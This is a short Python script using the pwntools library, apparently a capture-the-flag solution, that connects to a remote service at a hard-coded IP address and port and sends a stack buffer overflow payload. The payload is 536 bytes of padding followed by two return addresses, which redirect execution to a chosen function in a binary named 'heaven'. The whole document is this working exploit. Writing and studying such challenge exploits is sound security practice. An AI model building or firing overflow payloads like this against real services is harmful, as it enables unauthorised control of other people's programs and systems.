from pwn import *

#p = process("./heaven")
p = remote("52.59.124.14", 10050)

payload = b"a"*536
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401236)

p.recv()
p.sendline(payload)
print(p.recvall())
